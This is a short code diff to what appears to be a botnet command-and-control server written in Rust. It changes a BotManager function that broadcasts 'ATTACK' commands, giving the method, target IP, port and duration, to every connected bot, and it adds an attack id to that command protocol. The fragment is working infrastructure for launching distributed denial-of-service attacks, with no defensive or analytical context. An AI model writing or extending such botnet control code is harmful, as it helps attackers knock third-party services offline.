@@ -279,8 +279,9 @@ impl BotManager {
     }
     
     /// Broadcast attack command to all bots
-    pub async fn broadcast_attack(&self, method: &str, ip: &str, port: u16, duration: u64) {
-        let command = format!("ATTACK {} {} {} {}\n", method, ip, port, duration);
+    pub async fn broadcast_attack(&self, attack_id: usize, method: &str, ip: &str, port: u16, duration: u64) {
+        // Protocol: ATTACK <id> <method> <ip> <port> <duration>
+        let command = format!("ATTACK {} {} {} {} {}\n", attack_id, method, ip, port, duration);
         let bots = self.get_all_bots().await;
         
         for bot in bots {
